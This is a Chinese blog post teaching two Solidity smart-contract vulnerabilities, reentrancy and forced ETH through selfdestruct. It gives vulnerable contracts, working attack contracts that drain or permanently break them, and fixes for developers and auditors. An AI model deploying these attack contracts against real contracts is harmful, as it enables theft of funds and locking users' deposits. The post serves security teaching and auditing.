<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>solidity 漏洞 | 三叶的故事</title><meta name="author" content="三叶"><meta name="copyright" content="三叶"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="1重入漏洞最经典的故事： 为了让大家更好理解，这里给大家讲一个”黑客0xAA抢银行”的故事。 以太坊银行的柜员都是机器人（Robot），由智能合约控制。当正常用户（User）来银行取钱时，它的服务流程：  查询用户的 ETH 余额，如果大于 0，进行下一步。 将用户的 ETH 余额从银行转给用户，并询问用户是否收到。 将用户名下的余额更新为0。  一天黑客 0xAA 来到了银行，这是他和机器人柜员">
<meta property="og:type" content="article">
<meta property="og:title" content="solidity 漏洞">
<meta property="og:url" content="http://example.com/2025/03/20/%E5%90%88%E7%BA%A6%E4%B8%AD%E7%9A%84%E5%90%84%E7%A7%8D%E6%BC%8F%E6%B4%9E/index.html">
<meta property="og:site_name" content="三叶的故事">
<meta property="og:description" content="1重入漏洞最经典的故事： 为了让大家更好理解，这里给大家讲一个”黑客0xAA抢银行”的故事。 以太坊银行的柜员都是机器人（Robot），由智能合约控制。当正常用户（User）来银行取钱时，它的服务流程：  查询用户的 ETH 余额，如果大于 0，进行下一步。 将用户的 ETH 余额从银行转给用户，并询问用户是否收到。 将用户名下的余额更新为0。  一天黑客 0xAA 来到了银行，这是他和机器人柜员">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://example.com/img/san-ye.png">
<meta property="article:published_time" content="2025-03-19T16:00:00.000Z">
<meta property="article:modified_time" content="2025-03-25T12:40:45.612Z">
<meta property="article:author" content="三叶">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://example.com/img/san-ye.png"><script type="application/ld+json">{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "solidity 漏洞",
  "url": "http://example.com/2025/03/20/%E5%90%88%E7%BA%A6%E4%B8%AD%E7%9A%84%E5%90%84%E7%A7%8D%E6%BC%8F%E6%B4%9E/",
  "image": "http://example.com/img/san-ye.png",
  "datePublished": "2025-03-19T16:00:00.000Z",
  "dateModified": "2025-03-25T12:40:45.612Z",
  "author": [
    {
      "@type": "Person",
      "name": "三叶",
      "url": "http://example.com/"
    }
  ]
}</script><link rel="shortcut icon" href="/img/bi-qi-gu.png"><link rel="canonical" href="http://example.com/2025/03/20/%E5%90%88%E7%BA%A6%E4%B8%AD%E7%9A%84%E5%90%84%E7%A7%8D%E6%BC%8F%E6%B4%9E/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
    (() => {
      
    const saveToLocal = {
      set: (key, value, ttl) => {
        if (!ttl) return
        const expiry = Date.now() + ttl * 86400000
        localStorage.setItem(key, JSON.stringify({ value, expiry }))
      },
      get: key => {
        const itemStr = localStorage.getItem(key)
        if (!itemStr) return undefined
        const { value, expiry } = JSON.parse(itemStr)
        if (Date.now() > expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return value
      }
    }

    window.btf = {
      saveToLocal,
      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
        script.onload = script.onreadystatechange = () => {
          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
        }
        script.onerror = reject
        document.head.appendChild(script)
      }),
      getCSS: (url, id) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onload = link.onreadystatechange = () => {
          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
        }
        link.onerror = reject
        document.head.appendChild(link)
      }),
      addGlobalFn: (key, fn, name = false, parent = window) => {
        if (!false && key.startsWith('pjax')) return
        const globalFn = parent.globalFn || {}
        globalFn[key] = globalFn[key] || {}
        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
        parent.globalFn = globalFn
      }
    }
  
      
      const activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      const activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }

      btf.activateDarkMode = activateDarkMode
      btf.activateLightMode = activateLightMode

      const theme = saveToLocal.get('theme')
    
          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
        
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
      }
    
      
    const detectApple = () => {
      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
  
    })()
  </script><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
  copy: {
    success: '复制成功',
    error: '复制失败',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  dateSuffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'null',
  Snackbar: undefined,
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
    buttonText: '加载更多'
  },
  isPhotoFigcaption: false,
  islazyloadPlugin: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'solidity 漏洞',
  isHighlightShrink: false,
  isToc: true,
  pageType: 'post'
}</script><link rel="stylesheet" href="/css/custom.css"><link rel="stylesheet" href="/themes/butterfly/source/css/index.css"><link rel="stylesheet" href="/themes/butterfly/source/css/custom.css"><meta name="generator" content="Hexo 7.3.0"></head><body><div id="web_bg" style="background-image: url(/img/xue-zhi-xia2.jpg);"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/san-ye.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">3</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">2</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">2</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-list"></i><span> List</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> Movie</span></a></li></ul></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">三叶的故事</span></a><a class="nav-page-title" href="/"><span class="site-name">solidity 漏洞</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-list"></i><span> List</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> Movie</span></a></li></ul></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">solidity 漏洞</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2025-03-19T16:00:00.000Z" title="发表于 2025-03-20 00:00:00">2025-03-20</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-03-25T12:40:45.612Z" title="更新于 2025-03-25 20:40:45">2025-03-25</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/solidity/">solidity</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h1 id="1重入漏洞"><a href="#1重入漏洞" class="headerlink" title="1重入漏洞"></a>1重入漏洞</h1><p>最经典的故事：</p>
<p>为了让大家更好理解，这里给大家讲一个”黑客<code>0xAA</code>抢银行”的故事。</p>
<p>以太坊银行的柜员都是机器人（Robot），由智能合约控制。当正常用户（User）来银行取钱时，它的服务流程：</p>
<ol>
<li>查询用户的 <code>ETH</code> 余额，如果大于 0，进行下一步。</li>
<li>将用户的 <code>ETH</code> 余额从银行转给用户，并询问用户是否收到。</li>
<li>将用户名下的余额更新为<code>0</code>。</li>
</ol>
<p>一天黑客 <code>0xAA</code> 来到了银行，这是他和机器人柜员的对话：</p>
<ul>
<li>0xAA : 我要取钱，<code>1 ETH</code>。</li>
<li>Robot: 正在查询您的余额：<code>1 ETH</code>。正在转帐<code>1 ETH</code>到您的账户。您收到钱了吗？</li>
<li>0xAA : 等等，我要取钱，<code>1 ETH</code>。</li>
<li>Robot: 正在查询您的余额：<code>1 ETH</code>。正在转帐<code>1 ETH</code>到您的账户。您收到钱了吗？</li>
<li>0xAA : 等等，我要取钱，<code>1 ETH</code>。</li>
<li>Robot: 正在查询您的余额：<code>1 ETH</code>。正在转帐<code>1 ETH</code>到您的账户。您收到钱了吗？</li>
<li>0xAA : 等等，我要取钱，<code>1 ETH</code>。</li>
<li>…</li>
</ul>
<p>最后，<code>0xAA</code>通过重入攻击的漏洞，把银行的资产搬空了，银行卒。</p>
<p><img src="https://www.wtf.academy/assets/images/S01-1-6328e572390075b19e16cfd5dfc67ab5.png" alt="img"></p>
<h2 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h2><h3 id="银行合约"><a href="#银行合约" class="headerlink" title="银行合约"></a>银行合约</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">contract Bank &#123;</span><br><span class="line">    mapping (address =&gt; uint256) public balanceOf;    // 显示出该地址的余额</span><br><span class="line">// 存入ether，并更新余额</span><br><span class="line">//存款函数，讲ETH存入银行</span><br><span class="line">function deposit() external payable &#123;</span><br><span class="line">    balanceOf[msg.sender] += msg.value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 提取msg.sender的全部ether</span><br><span class="line">//提款函数，</span><br><span class="line">function withdraw() external &#123;</span><br><span class="line">    uint256 balance = balanceOf[msg.sender]; // 获取余额</span><br><span class="line">    require(balance &gt; 0, &quot;Insufficient balance&quot;);</span><br><span class="line">    // 转账 ether !!! 可能激活恶意合约的fallback/receive函数，有重入风险！</span><br><span class="line">    (bool success, ) = msg.sender.call&#123;value: balance&#125;(&quot;&quot;);</span><br><span class="line">    require(success, &quot;Failed to send Ether&quot;);</span><br><span class="line">    // 更新余额</span><br><span class="line">    balanceOf[msg.sender] = 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 获取银行合约的余额</span><br><span class="line">function getBalance() external view returns (uint256) &#123;</span><br><span class="line">    return address(this).balance;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="攻击合约"><a href="#攻击合约" class="headerlink" title="攻击合约"></a>攻击合约</h3><p>重入攻击的一个攻击点就是合约转账ETH的地方，转账ETH地方地址如果是合约，会触发fallback（回退函数），从而造成循环调用的可能，</p>
<ul>
<li>构造函数: 初始化<code>Bank</code>合约地址。</li>
<li><code>receive()</code>: 回调函数，在接收<code>ETH</code>时被触发，并再次调用<code>Bank</code>合约的<code>withdraw()</code>函数，循环提款。</li>
<li><code>attack()</code>：攻击函数，先<code>Bank</code>合约的<code>deposit()</code>函数存款，然后调用<code>withdraw()</code>发起第一次提款，之后<code>Bank</code>合约的<code>withdraw()</code>函数和攻击合约的<code>receive()</code>函数会循环调用，将<code>Bank</code>合约的<code>ETH</code>提空。</li>
<li><code>getBalance()</code>：获取攻击合约里的<code>ETH</code>余额。</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">contract Attack &#123;</span><br><span class="line">    Bank public bank; // Bank合约地址</span><br><span class="line"></span><br><span class="line">    // 初始化Bank合约地址</span><br><span class="line">    constructor(Bank _bank) &#123;</span><br><span class="line">        bank = _bank;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 回调函数，用于重入攻击Bank合约，反复的调用目标的withdraw函数</span><br><span class="line">    receive() external payable &#123;</span><br><span class="line">        if (bank.getBalance() &gt;= 1 ether) &#123;</span><br><span class="line">            bank.withdraw();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 攻击函数，调用时 msg.value 设为 1 ether</span><br><span class="line">    function attack() external payable &#123;</span><br><span class="line">        require(msg.value == 1 ether, &quot;Require 1 Ether to attack&quot;);</span><br><span class="line">        bank.deposit&#123;value: 1 ether&#125;();</span><br><span class="line">        bank.withdraw();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 获取本合约的余额</span><br><span class="line">    function getBalance() external view returns (uint256) &#123;</span><br><span class="line">        return address(this).balance;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="预防方法"><a href="#预防方法" class="headerlink" title="预防方法"></a>预防方法</h3><p> 检查-影响-交互模式（checks-effect-interaction）和重入锁。</p>
<h4 id="检查-影响-交互模式"><a href="#检查-影响-交互模式" class="headerlink" title="检查-影响-交互模式"></a>检查-影响-交互模式</h4><p>要求先检查状态变量是否符合要求，紧接着更新状态变量（余额），最后在和别的合约交互，讲bank合约和withdraw（）函数中的更新余额提前转账到ETH之前，就可以修复漏洞。</p>
<h4 id="重入锁"><a href="#重入锁" class="headerlink" title="重入锁"></a>重入锁</h4><p>一种防止重入函数的修饰器，包含一个默认为0变量的状态变量_status,被被<code>nonReentrant</code>重入锁修饰的函数，在第一次调用时会检查 _status是否为零。紧接着将 _status的值改为1，调用结束再改为零。这样，当攻击合约在调用结束前第二次的调用就会报错，重入攻击失败。</p>
<p>uint256 private _status; &#x2F;&#x2F; 重入锁</p>
<p>&#x2F;&#x2F; 重入锁<br>modifier nonReentrant() {<br>    &#x2F;&#x2F; 在第一次调用 nonReentrant 时，_status 将是 0<br>    require(_status &#x3D;&#x3D; 0, “ReentrancyGuard: reentrant call”);<br>    &#x2F;&#x2F; 在此之后对 nonReentrant 的任何调用都将失败<br>    _status &#x3D; 1;<br>    _;<br>    &#x2F;&#x2F; 调用结束，将 _status 恢复为0<br>    _status &#x3D; 0;<br>}</p>
<p>只需要用<code>nonReentrant</code>重入锁修饰<code>withdraw()</code>函数，就可以预防重入攻击了。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">// 用重入锁保护有漏洞的函数</span><br><span class="line">function withdraw() external nonReentrant&#123;</span><br><span class="line">    uint256 balance = balanceOf[msg.sender];</span><br><span class="line">    require(balance &gt; 0, &quot;Insufficient balance&quot;);</span><br><span class="line"></span><br><span class="line">    (bool success, ) = msg.sender.call&#123;value: balance&#125;(&quot;&quot;);</span><br><span class="line">    require(success, &quot;Failed to send Ether&quot;);</span><br><span class="line"></span><br><span class="line">    balanceOf[msg.sender] = 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="2自毁函数（不可预期的ETH"><a href="#2自毁函数（不可预期的ETH" class="headerlink" title="2自毁函数（不可预期的ETH)"></a>2自毁函数（不可预期的ETH)</h1><p><strong>自毁函数</strong>由以太坊智能合约提供，用于销毁区块链上的合约系统。当合约执行自毁操作时，合约账户上剩余的以太币会发送给指定的目标，然后其存储和代码从状态中被移除。然而，自毁函数也是一把双刃剑，一方面它可以使开发人员能够从以太坊中删除智能合约并在紧急情况下转移以太币。另一方面自毁函数也可能成为攻击者的利用工具，攻击者可以利用该函数向目标合约“强制转账”从而影响目标合约的正常功能（比如开发者使用 address(this).balance 来取合约中的代币余额就可能会被攻击）。今天我们就来看一个攻击者利用自毁函数的强制转账特性对智能合约发起攻击导目标合约瘫痪的案例。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line"></span><br><span class="line">pragma solidity ^0.8.10;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//一个简单的以太坊游戏，</span><br><span class="line"></span><br><span class="line">contract EtherGame &#123;</span><br><span class="line"></span><br><span class="line">  uint public targetAmount = 7 ether; //设置目标金额 7以太坊</span><br><span class="line"></span><br><span class="line">  address public winner; //定义一个获胜者</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  function deposit() public payable &#123;</span><br><span class="line"></span><br><span class="line">​    require(msg.value == 1 ether, &quot;You can only send 1 Ether&quot;); //确保每一个人打入的是一以太坊</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">​    uint balance = address(this).balance; //获取当前合约的以太坊多少</span><br><span class="line"></span><br><span class="line">​    require(balance &lt;= targetAmount, &quot;Game is over&quot;); //判断当前的以太坊数量是否满足目标量</span><br><span class="line"></span><br><span class="line">​    //，如果满足或者超过游戏结束</span><br><span class="line"></span><br><span class="line">​    //如果当前金额达到目标金额则当前参与者或者7eth</span><br><span class="line"></span><br><span class="line">​    if (balance == targetAmount) &#123;</span><br><span class="line"></span><br><span class="line">​      winner = msg.sender;</span><br><span class="line"></span><br><span class="line">​    &#125;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  //发放奖金的函数</span><br><span class="line"></span><br><span class="line">  function claimReward() public &#123;</span><br><span class="line"></span><br><span class="line">​    require(msg.sender == winner, &quot;Not winner&quot;); //检查时候有获胜者</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">​    (bool sent, ) = msg.sender.call&#123;value: address(this).balance&#125;(&quot;&quot;); //将合约中的eth发送给获胜者</span><br><span class="line"></span><br><span class="line">​    require(sent, &quot;Failed to send Ether&quot;); //检测send是否成功，如果失败回滚交易</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="合约解析"><a href="#合约解析" class="headerlink" title="合约解析"></a>合约解析</h2><p>EtherGame 合约实现的功能是一个游戏，我们这里可以称它为“幸运七”。玩家每次向 EtherGame 合约中打入一个以太，第七个成功打入以太的玩家将成为 winner。winner 可以提取合约中的 7 个以太。</p>
<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>玩家每次玩游戏时都会调用 EtherGame.deposit 函数向合约中先打入一个以太，随后函数会检查合约中的余额(balance)是否小于等于 7 ，只有合约中的余额小于等于 7 时才能继续否则将回滚。合约中的余额(balance)是通过 address(this).balance 取到的，这就意味着我们只要有办法在产生 winner 之前改变 EtherGame 合约中的余额让他等于 7 就会使该合约瘫痪。这样我们的攻击方向就明确了，只要我们强制给 EtherGame 合约打入一笔以太让该合约中的余额大于或等于 7 这样后面的玩家将无法通过 EtherGame.deposit 的检查，从而使 EtherGame 合约瘫痪，永远无法产生 winner。</p>
<p>但是 EtherGame.deposit 的函数存在验证，：require(msg.value &#x3D;&#x3D; 1 ether, “You can only send 1 Ether”)，这里要求我们每次只能打一个以太进去，所以想通过正常的路径打入多个以太坊是不可行的，</p>
<p>这就需要自毁函数（selfdestruct） 当合约执行自毁操作时，合约账户的余额就会发送个指定目标。</p>
<p>构建一个攻击合约，触发自毁函数，使攻击合约里的资金全部发送给EtherGame 这样就达到一次性发送多个以太坊，从而完成攻击。</p>
<h3 id="攻击合约代码"><a href="#攻击合约代码" class="headerlink" title="攻击合约代码"></a>攻击合约代码</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line"></span><br><span class="line">pragma solidity ^0.8.10;</span><br><span class="line"></span><br><span class="line">import &#123;EtherGame&#125; from &quot;./EtherGamer.sol&quot;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">contract Attack &#123;</span><br><span class="line"></span><br><span class="line">  EtherGame etherGame; //声明一个状态变量</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  constructor(EtherGame _etherGame) &#123;</span><br><span class="line"></span><br><span class="line">​    etherGame = EtherGame(_etherGame); //构造函数接受合约地址并且将其储存在etherGame中</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  function attack() public payable &#123;</span><br><span class="line"></span><br><span class="line">​    address payable addr = payable(address(etherGame)); // 将etherGame合约的地址转换为可支付地址</span><br><span class="line"></span><br><span class="line">​    selfdestruct(addr); //自毁函数，可以将当前合约所有的以太坊全部发送给EtherGame合约</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="引用具体例子了解"><a href="#引用具体例子了解" class="headerlink" title="引用具体例子了解"></a>引用具体例子了解</h2><p>玩家一：Alice</p>
<p>玩家二：Bob</p>
<p>攻击者：Eve</p>
<p>\1. 开发者部署 EtherGame 合约；</p>
<p>\2. 玩家 Alice 决定玩游戏，她这辈子玩游戏从来没赢过，她觉得这个游戏可以让她体验一次当 winner 的快感，所以她决定连续调用 EtherGame.deposit 存入 7 个以太这样她就一定是 winner！正当她操作到第六次眼看还有一次今成功的时候，意外发生了（此时合约中已经有 Alice 存入的 6 个以太了）；</p>
<p>\3. 攻击者 Eve 部署 Attack 合约并在构造函数中传入 EtherGame 合约的地址；</p>
<p>\4. 攻击者 Eve 调用 Attack.attack 并设置 msg.value &#x3D; 1 ，函数触发 selfdestruct 将这 1 个以太强制打入 EtherGame 合约中。此时 EtherGame 合约中有 7 个以太（分别为 Alice 的六个以太和攻击者刚刚打入的 1 个以太）；</p>
<p>\5. 这时玩家 Bob 也决定玩游戏，存入 1 个以太后合约中有 7+1&#x3D;8 个以太，无法通过 require(balance &lt;&#x3D; targetAmount, “Game is over”) 的检查并回滚。到这里我们已经成功的使 EtherGame 合约瘫痪了，这个游戏将永远不会产生 winner，Alice 的 winner 梦也就此破灭了，6 个以太被永远的锁在了 EtherGame 合约中。哎，可怜的 Alice 。</p>
<p>下面是攻击流程图：</p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_jpg/qsQ2ibEw5pLb8mC7zprosEbQ16WhX3MTL30qnhR09icx486RZVu6soWccUib8PmOeNOy4BXXRvibk4elKrDpKicaalg/640?wx_fmt=jpeg&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p>
<h2 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h2><p><strong>1）作为开发者</strong></p>
<p>这里我们就拿上面的漏洞合约 EtherGame 来说，这个合约可以被攻击者攻击是因为依赖了 address(this).balance 来获取合约中的余额且这个值可以影响业务逻辑，所以我们这里可以设置一个变量 balance，只有玩家通过 EtherGame.deposit 成功向合约打入以太后 balance 才会增加。这样只要不是通过正常途径进来的以太都不会影响我们的 balance 了，避免强制转账导致的记账错误。下面是修复代码：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">contract EtherGame &#123;</span><br><span class="line">    uint256 public targetAmount = 3 ether;</span><br><span class="line">    uint256 public balance;</span><br><span class="line">    address public winner;</span><br><span class="line"></span><br><span class="line">    function deposit() public payable &#123;</span><br><span class="line">        require(msg.value == 1 ether, &quot;You can only send 1 Ether&quot;);</span><br><span class="line">        balance += msg.value;</span><br><span class="line">        require(balance &lt;= targetAmount, &quot;Game is over&quot;);</span><br><span class="line">        if (balance == targetAmount) winner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function claimReward() public &#123;</span><br><span class="line">        require(msg.sender == winner, &quot;Not winner&quot;);</span><br><span class="line">        (bool sent,) = msg.sender.call&#123;value: balance&#125;(&quot;&quot;);</span><br><span class="line">        require(sent, &quot;Failed to send Ether&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p><strong>（2）作为审计者</strong></p>
<p>作为审计者我们需要结合真实的业务逻辑来查看 address(this).balance 的使用是否会影响合约的正常逻辑，如果会影响那我们就可以初步认为这个合约存在被攻击者强制打入非预期的资金从而影响正常业务逻辑的可能（比如被 selfdestruct 攻击）。在审计过程中还需要结合实际的代码逻辑来进行分析。</p>
